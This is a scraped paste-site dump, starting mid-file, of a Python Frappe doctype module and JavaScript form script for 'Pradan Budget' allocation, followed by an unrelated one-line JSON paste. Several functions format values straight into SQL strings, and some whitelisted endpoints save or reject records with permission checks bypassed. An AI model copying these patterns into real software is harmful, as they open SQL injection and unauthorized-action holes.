				row.db_set('budget_item_entry', budget_item_entry)

	def on_trash(self):
		for row in self.allocations:
			if row.budget_item_entry:
				frappe.db.delete('Pradan Budget Item Entry', row.budget_item_entry)
		frappe.db.commit()

	def on_submit(self):
		if not self.generated:
			frappe.throw('Set availability before submit')

	def check_duplicate_projects(self):
		budget_id = get_budget_from_project(self.project)
		if budget_id and budget_id!= self.name:
			frappe.throw('Budget already created for this Project')

	@frappe.whitelist()
	def generate_allocation_rows(self):
		self.allocations = []
		for fy_year in self.fy_wise_breakup:
			for ledger_row in self.ledger_mapping:
				row = self.append('allocations')
				row.project = self.project
				row.budget_item = ledger_row.budget_line_item
				row.sub_budget_item = ledger_row.sub_budget_line_item
				row.fiscal_year = fy_year.fiscal_year
				row.available_amount = 0
		self.year_wise_allocation = []
		for year_wise_alloc in self.year_wise_breakup:
			for ledger_row in self.ledger_mapping:
				row = self.append('year_wise_allocation')
				row.project = self.project
				row.budget_item = ledger_row.budget_line_item
				row.sub_budget_item = ledger_row.sub_budget_line_item
				row.from_date = year_wise_alloc.from_date
				row.to_date = year_wise_alloc.to_date
				row.available_amount = 0
		self.generated = 1
		self.save()

	def set_initial_values(self):
		if self.project:
			teams = get_project_teams(self.project)
			self.teams = []
			for team in teams:
				self.append('teams', {'teams':team})
			budget_items = get_budget_items(self.project)
			self.ledger_mapping = []
			for budget_item in budget_items:
				row = self.append('ledger_mapping')
				row.budget_line_item = budget_item.budget_line_item
				row.sub_budget_line_item = budget_item.sub_budget_line_item
				row.year_maximum = 0
				row.fy_maximum = 0
				row.year_total = 0
				row.fy_total = 0

		if self.year_wise_breakdown_count:
			year_wise_breakups = get_year_wise_breakup_from_project(self.project)
			self.year_wise_breakup = []
			for year_wise_breakup in year_wise_breakups:
				self.append('year_wise_breakup',{
					'from_date': year_wise_breakup.from_date,
					'to_date': year_wise_breakup.to_date,
					'amount': 0
				})
		if self.project_start_date and self.project_end_date:
			fiscal_years = get_fiscal_years(self.project_start_date, self.project_end_date)
			self.fy_wise_breakup = []
			for fy_year in fiscal_years:
				row = self.append('fy_wise_breakup')
				row.fiscal_year = fy_year
				row.amount = 0

	def calculate_fy_totals(self):
		fy_total = 0
		for row in self.fy_wise_breakup:
			amount = get_fy_total(self.name, row.fiscal_year)
			row.amount = amount
			row.db_set('amount', amount)
			fy_total += amount
		self.fy_wise_total = fy_total
		self.fy_wise_balance = self.budget_size - fy_total
		self.db_set('fy_wise_total', fy_total)
		self.db_set('fy_wise_balance', self.budget_size - fy_total)

	def calculate_year_totals(self):
		year_total = 0
		for row in self.year_wise_breakup:
			amount = get_year_total(self.name, row.from_date, row.to_date)
			row.amount = amount
			row.db_set('amount', amount)
			year_total += amount
		self.year_wise_total = year_total
		self.year_wise_balance = self.budget_size - year_total
		self.db_set('year_wise_total', year_total)
		self.db_set('year_wise_balance', self.budget_size - year_total)

	def validate_totals(self):
		if not self.budget_size:
			frappe.throw('Please define the Budget Size at Project level.')
		if self.budget_size < self.fy_wise_total:
			frappe.throw('Total FY wise budget exceeded than Budget Size.')
		if self.budget_size < self.year_wise_total:
			frappe.throw('Total Year wise budget exceeded than Budget Size.')
		if self.budget_size < self.total_fy_maximum:
			frappe.throw('Total FY maximum budget exceeded than Budget Size.')
		if self.budget_size < self.total_year_maximum:
			frappe.throw('Total year maximum budget exceeded than Budget Size.')

	def calculate_totals(self):
		self.calculate_fy_totals()
		self.calculate_year_totals()
		values = get_year_and_fy_maximum(self.name)
		self.total_year_maximum = values.total_year_max
		self.total_fy_maximum = values.total_fy_max
		self.db_set('total_year_maximum', values.total_year_max)
		self.db_set('total_fy_maximum', values.total_fy_max)
		for row in self.ledger_mapping:
			year_total = float(get_item_wise_year_total(self.name, row.sub_budget_line_item))
			fy_total = float(get_item_wise_fy_total(self.name, row.sub_budget_line_item))
			if row.year_maximum and year_total:
				if float(row.year_maximum) < year_total:
					frappe.throw('Total year wise budget exceeded than maximum assigned budget for `Row: {0}`'.format(row.idx))
			if row.fy_maximum and fy_total:
				if float(row.fy_maximum) < fy_total:
					frappe.throw('Total fy wise budget exceeded than maximum assigned budget for `Row: {0}`'.format(row.idx))
			row.year_total = get_item_wise_year_total(self.name, row.sub_budget_line_item)
			row.fy_total = get_item_wise_fy_total(self.name, row.sub_budget_line_item)
			row.db_set('year_total', get_item_wise_year_total(self.name, row.sub_budget_line_item))
			row.db_set('fy_total', get_item_wise_fy_total(self.name, row.sub_budget_line_item))

	def generate_staff_and_project_wise_salary(self):
		if self.teams and self.fy_wise_breakup:
			for team in self.teams:
				for fy in self.fy_wise_breakup:
					if not frappe.db.exists('Staff and Project wise Salary', { 'teams':team.teams, 'fiscal_year':fy.fiscal_year }):
						staff_and_project_wise_salary = frappe.new_doc('Staff and Project wise Salary')
						staff_and_project_wise_salary.teams = team.teams
						staff_and_project_wise_salary.fiscal_year = fy.fiscal_year
						staff_and_project_wise_salary.insert()

	def on_cancel(self):
		if self.workflow_state == 'Rejected' and not self.rejection_feedback:
			frappe.throw(""Please add Rejection Feedback prior to Reject the Budget"")

def create_or_update_budget_item_entry(args):
	'''
		Method to create or update budget item entry
	'''
	if args.budget_item_entry:
		budget_item_entry_doc = frappe.get_doc('Pradan Budget Item Entry', args.budget_item_entry)
	else:
		budget_item_entry_doc = frappe.new_doc('Pradan Budget Item Entry')
	budget_item_entry_doc.pradan_budget = args.parent
	budget_item_entry_doc.project = args.project
	budget_item_entry_doc.budget_item = args.budget_item
	budget_item_entry_doc.sub_budget_item = args.sub_budget_item
	budget_item_entry_doc.project_duration = args.project_duration
	budget_item_entry_doc.fiscal_year = args.fiscal_year
	budget_item_entry_doc.available_amount = args.available_amount
	budget_item_entry_doc.allocated_amount = 0
	budget_item_entry_doc.balance_amount = args.available_amount
	budget_item_entry_doc.flags.ignore_mandatory = True
	budget_item_entry_doc.save(ignore_permissions=True)
	return budget_item_entry_doc.name

@frappe.whitelist()
def get_team_wise_budget(project, available_amount, sub_budget_item, fiscal_year, natural_head=None):
	'''
		Method to get default team and will equaly distribute amount
	'''
	# salary_natural_heads = ['Stipend to Apprentices', 'Salary & Benefits - Contractual Staff', 'Salary & Benefits - Associates', 'Salary & Benefits - Professionals']
	budget_id = get_budget_from_project(project)
	budget_item_entry = get_budget_item_entry(budget_id, sub_budget_item, fiscal_year)
	available_amount = float(available_amount)
	data = { 'is_salary_head':0, 'team_wise_budget':[] }
	total_teams, team_amount = 0, 0
	if budget_id and budget_item_entry:
		if not frappe.db.exists('Project', project):
			frappe.throw('Project `{0}` not found'.format(project))
		project_teams = frappe.db.get_all('Project Teams', filters={ 'parent':project }, fields=['name', 'teams'])
		budget_teams = frappe.db.get_all('Team wise Budget', filters={ 'parent':budget_item_entry }, fields=['name', 'teams', 'allocated_amount', 'remarks'])

		if budget_teams:
			for team in budget_teams:
				data['team_wise_budget'].append({'project':project, 'teams': team.teams, 'allocated_amount':team.allocated_amount, 'remarks':team.remarks })
		elif project_teams:
			total_teams = len(project_teams)
			team_amount = available_amount/total_teams
			for team in project_teams:
				data['team_wise_budget'].append({'project':project, 'teams': team.teams, 'allocated_amount':team_amount, 'remarks':team.remarks })
	return data

@frappe.whitelist()
def allocate_budget_to_teams(project, sub_budget_item, fiscal_year, values):
	'''
		Method to make the string in to json and allocate to each teams
	'''
	budget_id = get_budget_from_project(project)
	budget_item_entry = get_budget_item_entry(budget_id, sub_budget_item, fiscal_year)
	data = json.loads(values)
	if not frappe.db.exists('Pradan Budget Item Entry', budget_item_entry):
		frappe.throw('Budget Item Entry does not exists')
	if data.get('team_wise_budget'):
		team_wise_budget = data.get('team_wise_budget')
		budget_item_entry_doc = frappe.get_doc('Pradan Budget Item Entry', budget_item_entry)
		old_data = budget_item_entry_doc.teams
		budget_item_entry_doc.teams = []
		idx = 0
		if old_data:
			message = '<div><p>{0} has made changes as follows</p>'.format(frappe.session.user)
		else:
			message = False
		for row in team_wise_budget:
			team_wise_budget_row = budget_item_entry_doc.append('teams')
			team_wise_budget_row.budget_code = budget_item_entry_doc.name
			team_wise_budget_row.teams = row.get('teams')
			team_wise_budget_row.allocated_amount = row.get('allocated_amount')
			team_wise_budget_row.used_amount = 0
			team_wise_budget_row.remarks = row.get('remarks')
			if old_data:
				old_amount = 0
				if len(old_data)>=idx+1:
					old_amount = old_data[idx].get('allocated_amount')
				new_amount = row.get('allocated_amount') or 0
				teams = row.get('teams')
				message += '<p>{0}. Allocated Amount has been changed from {1} to {2} for Teams : {3}</p>'.format(idx+1, int(old_amount), int(new_amount), teams)
			idx += 1
		budget_item_entry_doc.save(ignore_permissions=True)
		if message:
			message += '</div>'
			budget_item_entry_doc.add_comment(""Comment"", text=message)
		mark_as_allocated(budget_item_entry)
	return 1

@frappe.whitelist()
def mark_as_allocated(budget_item_entry):
	'''
		Method to make the item row as allocated
	'''
	if frappe.db.exists('Pradan Budget Items', { 'budget_item_entry':budget_item_entry }):
		name = frappe.db.get_value('Pradan Budget Items', { 'budget_item_entry':budget_item_entry })
		frappe.db.set_value('Pradan Budget Items', name, 'allocated', 1)
		frappe.db.commit()
		frappe.msgprint(msg='Budget allocated successfully', indicator='green', alert=True)

def get_fy_total(budget_id, fiscal_year):
	'''
		Method to get total amount made availble for a fiscal year for all items
	'''
	total = 0
	query = '''
		SELECT
			IFNULL(SUM(available_amount), 0) as total
		FROM
			`tabPradan Budget Items`
		WHERE
			parent = ""{0}"" AND
			fiscal_year = ""{1}""
	'''
	output=frappe.db.sql(query.format(budget_id, fiscal_year), as_list=1)
	if output:
		total = output[0][0]
	return total

def get_year_total(budget_id, from_date, to_date):
	'''
		Method to get total amount made availble for a fiscal year for all items
	'''
	total = 0
	query = '''
		SELECT
			IFNULL(SUM(available_amount), 0) as total
		FROM
			`tabYear wise Allocation`
		WHERE
			parent = ""{0}"" AND
			from_date = DATE(""{1}"") AND
			to_date = DATE(""{2}"")
	'''
	output=frappe.db.sql(query.format(budget_id, getdate(from_date), getdate(to_date)), as_list=1)
	if output:
		total = output[0][0]
	return total


def get_year_and_fy_maximum(budget_id):
	'''
		Method to get total year_max and fy_max value
	'''
	values = { 'total_year_max':0, 'fy_maximum':0 }
	query = '''
		SELECT
			IFNULL(SUM(year_maximum), 0) as total_year_max,
			IFNULL(SUM(fy_maximum), 0) as total_fy_max
		FROM
			`tabLedger Mapping`
		WHERE
			parent = ""{0}""
	'''
	output=frappe.db.sql(query.format(budget_id), as_dict=1)
	if output:
		values = output[0]
	return values


def get_item_wise_fy_total(budget_id, sub_budget_item):
	'''
		Method to get FY wise total amount made availble for a sub budget item
	'''
	total = 0
	query = '''
		SELECT
			IFNULL(SUM(available_amount), 0) as total
		FROM
			`tabPradan Budget Items`
		WHERE
			parent = ""{0}"" AND
			sub_budget_item = ""{1}""
	'''
	output=frappe.db.sql(query.format(budget_id, sub_budget_item), as_list=1)
	if output:
		total = output[0][0]
	return total

def get_item_wise_year_total(budget_id, sub_budget_item):
	'''
		Method to get year wise total amount made availble for a sub budget item
	'''
	total = 0
	query = '''
		SELECT
			IFNULL(SUM(available_amount), 0) as total
		FROM
			`tabYear wise Allocation`
		WHERE
			parent = ""{0}"" AND
			sub_budget_item = ""{1}""
	'''
	output=frappe.db.sql(query.format(budget_id, sub_budget_item), as_list=1)
	if output:
		total = output[0][0]
	return total


@frappe.whitelist()
def get_budget_item_entry(budget_id, sub_budget_item, fiscal_year):
	'''
		Method to get Budget Item Entry for a sub budget item wrt fiscal_year
	'''
	budget_item_entry = False
	if frappe.db.exists('Pradan Budget Items', { 'parent':budget_id, 'sub_budget_item':sub_budget_item, 'fiscal_year':fiscal_year }):
		budget_item_entry = frappe.db.get_value('Pradan Budget Items', { 'parent':budget_id, 'sub_budget_item':sub_budget_item, 'fiscal_year':fiscal_year }, 'budget_item_entry')
	return budget_item_entry

@frappe.whitelist()
def is_able_to_create_budget(project, throw_error=0):
	'''
		Mehtod to check the availability to create budget from project
	'''
	able_to_create = 1
	if frappe.db.exists('Project', project):
		#Directly return 0 if budget already created
		budget_id = get_budget_from_project(project)
		if frappe.db.exists('Pradan Budget', budget_id):
			return 0
		project_size, project_start_date = frappe.db.get_value('Project', project, ['budget_size', 'project_start_date'])
		project_end_date, project_periodduration = frappe.db.get_value('Project', project, ['project_end_date', 'project_periodduration'])
		#Check project size
		if not project_size:
			if throw_error:
				frappe.throw('Please set Budget size')
			else:
				able_to_create = 0
		#Check project start date
		if not project_start_date:
			if throw_error:
				frappe.throw('Please set project start date')
			else:
				able_to_create = 0
		#Check project end date
		if not project_end_date:
			if throw_error:
				frappe.throw('Please set project end date!')
			else:
				able_to_create = 0
		#Check project duration
		if not project_periodduration:
			if throw_error:
				frappe.throw('Please set project duration!')
			else:
				able_to_create = 0
		#Check budget line items
		if not frappe.db.exists('Budget Line Items', { 'parent':project }):
			if throw_error:
				frappe.throw('Please create budget line items')
			else:
				able_to_create = 0
		#Check teams
		if not frappe.db.exists('Project Teams', { 'parent':project }):
			if throw_error:
				frappe.throw('Please set teams against this project')
			else:
				able_to_create = 0
		#Check Fiscal Years
		missing_fy = get_missing_fiscal_years(project_start_date, project_end_date)
		if missing_fy:
			if throw_error:
				frappe.throw('Please create missing fiscal years : {0}'.format(missing_fy))
			else:
				able_to_create = 0
	else:
		if throw_error:
			frappe.throw('Project `{0}` not found', project)
		else:
			able_to_create = 0
	return able_to_create

def get_year_wise_breakup_from_project(project):
	'''
		Method to get Year wise breakup from Project
	'''
	year_wise_breakup = []
	if frappe.db.exists('Year Wise Breakdown', { 'parent':project, 'parentfield':'year_wise_breakdown', 'parenttype':'Project' }):
		year_wise_breakup = frappe.db.get_all('Year Wise Breakdown', filters={ 'parent':project, 'parentfield':'year_wise_breakdown', 'parenttype':'Project' }, fields=['from_date', 'to_date'], order_by='idx asc')
	return year_wise_breakup

@frappe.whitelist()
def reject_with_feedback(budget_id, feedback):
	'''
		Method to Reject the budget with feedback
	'''
	if frappe.db.exists('Pradan Budget', budget_id) and feedback:
		frappe.db.set_value('Pradan Budget', budget_id, 'rejection_feedback', feedback)
		frappe.db.set_value('Pradan Budget', budget_id, 'workflow_state', 'Rejected')
		frappe.get_doc('Pradan Budget', budget_id).cancel()
	return 1
"
AHhy7ac5,pradan_budget.js,SherinKR,JavaScript,Saturday 2nd of March 2024 02:09:28 AM CDT,"// Copyright (c) 2023, New Indictranstech and contributors
// For license information, please see license.txt

frappe.ui.form.on('Pradan Budget', {
	refresh: function(frm) {
		frm.disable_save();
		frm.disable_form();
		add_buttons(frm);
	}
});

frappe.ui.form.on('Pradan Budget Items', {
	allocate: function(frm, cdt, cdn){
		let child = locals[cdt][cdn];
		if(child.allocated == 0 && frm.doc.docstatus == 1){
			budget_allocation_popup(frm, cdt, cdn);
		}
		else {
			frm.fields_dict.allocations.grid.update_docfield_property('allocate', ""hidden"", 1);
			frappe.throw('Budget allocation will be possible only after defining availability.')
		}
	}
});

function budget_allocation_popup(frm, cdt, cdn){
	var child = locals[cdt][cdn];
	let d = new frappe.ui.Dialog({
		title: 'Team Allocation',
		size: ""large"",
		fields: [
			{
				label: ""Available Amount"",
				fieldname: ""allocated_amount"",
				fieldtype: ""Currency"",
				read_only: 1,
				default: child.available_amount
			},
			{
				label: ""Team wise Budget"",
				fieldname: ""team_wise_budget"",
				fieldtype: ""Table"",
				reqd: 1,
				cannot_add_rows: true,
				in_place_edit: true,
				fields: [
					{
						fieldtype: 'Link',
						label: 'Project',
						fieldname: 'project',
						options: 'Project',
						in_list_view: 1,
						reqd: 1,
						read_only: 1
					},
					{
						fieldtype: 'Link',
						label: 'Teams',
						fieldname: 'teams',
						options: 'Branch',
						in_list_view: 1,
						reqd: 1,
						read_only: 1
					},
					{
						fieldtype: 'Currency',
						label: 'Allocated Amount',
						fieldname: 'allocated_amount',
						in_list_view: 1,
						reqd: 1,
						default: 0
					}
				]
			}
		],
		primary_action_label: 'Allocate',
		primary_action(values) {
			allocate_budget_to_teams(frm, child, values);
			d.hide();
		}
	});
	frappe.call({
		method: 'pradan.pradan.doctype.pradan_budget.pradan_budget.get_team_wise_budget',
		args: {
			project: child.project,
			available_amount: child.available_amount
		},
		freeze: true,
		freeze_message: 'Fetching teams..',
		callback: (r) => {
			if(r.message){
				let data = r.message;
				d.fields_dict.team_wise_budget.df.data = data
				d.fields_dict.team_wise_budget.grid.refresh();
			}
			else {
				frappe.throw('No team has allocated to this Project')
			}
		},
	});
	d.show();
}

function allocate_budget_to_teams(frm, child, values){
	frappe.call({
		method: 'pradan.pradan.doctype.pradan_budget.pradan_budget.allocate_budget_to_teams',
		args: {
			project: child.project,
			sub_budget_item: child.sub_budget_item,
			fiscal_year: child.fiscal_year,
			values: values
		},
		freeze: true,
		freeze_message: 'Allocating to teams..',
		callback: (r) => {
			frm.reload_doc();
		},
	})
}

function add_buttons(frm){
	if(!frm.is_new()){
		if(frm.doc.workflow_state != 'Rejected'){
			frm.add_custom_button('Detailed View', () => {
				frappe.set_route('Form', 'Budget Tool', 'Budget Tool');
			}).addClass('btn-primary');
		}
		if(['Pending', 'Approved'].includes(frm.doc.workflow_state)){
			frm.add_custom_button('Reject with Feedback', () => {
				let d = new frappe.ui.Dialog({
					title: 'Rejection Feedback',
					fields: [
						{
							label: 'Feedback',
							fieldname: 'feedback',
							fieldtype: 'Small Text',
							reqd: 1
						}
					],
					primary_action_label: 'Reject',
					primary_action(values) {
						frappe.call({
							method: 'pradan.pradan.doctype.pradan_budget.pradan_budget.reject_with_feedback',
							args: {
								budget_id: frm.doc.name,
								feedback: values.feedback
							},
							freeze: true,
							freeze_message: 'Rejecting with feedback',
							callback: (r) => {
								frm.reload_doc();
							},
						});
						d.hide();
					}
				});
				d.show();
			}).addClass('btn-danger');
		}
	}
}
"
KKmG2rLN,Untitled,wantoofreeho,JSON,Saturday 2nd of March 2024 01:59:50 AM CDT,"[`+`,`+`,`+`,`+`,`+`,`+`,`+`,`-`,`-`,`±`,`±`]"
